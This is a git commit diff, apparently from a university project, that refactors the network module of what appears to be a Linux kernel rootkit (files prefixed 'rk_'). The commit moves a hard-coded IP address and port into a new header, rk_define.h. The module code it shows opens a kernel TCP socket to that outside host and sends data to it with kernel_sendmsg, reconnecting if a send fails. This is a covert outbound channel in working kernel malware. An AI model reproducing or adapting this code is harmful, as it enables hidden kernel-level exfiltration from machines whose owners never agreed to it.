63278cc7e704e82de7c2b183c654d77347a24bea
Chang-Yen Tseng <tsengcy@cs.wisc.edu>
2021-09-17 13:24:59 -0500

    Split define

---
+++ rk_define.h
@@ -0,0 +1,4 @@
+#pragma once
+#define PORT 11348
+#pragma once
+#define IP "172.20.77.146"
--- rk_net.h
+++ rk_net.h
@@ -2,16 +2,15 @@
 #include <linux/inet.h>
 #include <linux/socket.h>
 #include <net/sock.h>
+#include "rk_define.h"
 
-#define IP "172.20.77.146"
-#define PORT 43933
-struct socket* sock;
+struct socket* rk_sock;
 
 int rk_net_init(void) {
   struct sockaddr_in s_addr;
   int ret = 0;
-  sock = (struct socket*)kmalloc(sizeof(struct socket), GFP_KERNEL);
-  ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
+  rk_sock = (struct socket*)kmalloc(sizeof(struct socket), GFP_KERNEL);
+  ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &rk_sock);
   if (ret < 0) {
     printk("sock_create_kern failed\n");
     return ret;
@@ -20,9 +19,9 @@ int rk_net_init(void) {
   s_addr.sin_family = AF_INET;
   s_addr.sin_port = htons(PORT);
   s_addr.sin_addr.s_addr = in_aton(IP);
-  ret = sock->ops->connect(sock, (struct sockaddr*)&s_addr, sizeof(s_addr), 0);
+  ret = rk_sock->ops->connect(rk_sock, (struct sockaddr*)&s_addr, sizeof(s_addr), 0);
   if (ret != 0) {
-    printk("sock->ops->connect failed\n");
+    printk("rk_sock->ops->connect failed\n");
     return ret;
   }
   return 0;
@@ -37,11 +36,11 @@ int rk_net_send(char* s) {
   memset(&kvec, 0, sizeof(kvec));
   kvec.iov_base = s;
   kvec.iov_len = buf_sz;
-  ret = kernel_sendmsg(sock, &msghdr, &kvec, 1, buf_sz);
+  ret = kernel_sendmsg(rk_sock, &msghdr, &kvec, 1, buf_sz);
   if (ret < 0) {
     // try again
     rk_net_init();
-    ret = kernel_sendmsg(sock, &msghdr, &kvec, 1, buf_sz);
+    ret = kernel_sendmsg(rk_sock, &msghdr, &kvec, 1, buf_sz);
     if (ret < 0) {
       printk("kernel_sendmsg failed\n");
       return ret;
@@ -51,6 +50,6 @@ int rk_net_send(char* s) {
 }
 
 void rk_net_exit(void) {
-  kernel_sock_shutdown(sock, SHUT_RDWR);
-  sock_release(sock);
+  kernel_sock_shutdown(rk_sock, SHUT_RDWR);
+  sock_release(rk_sock);
 }
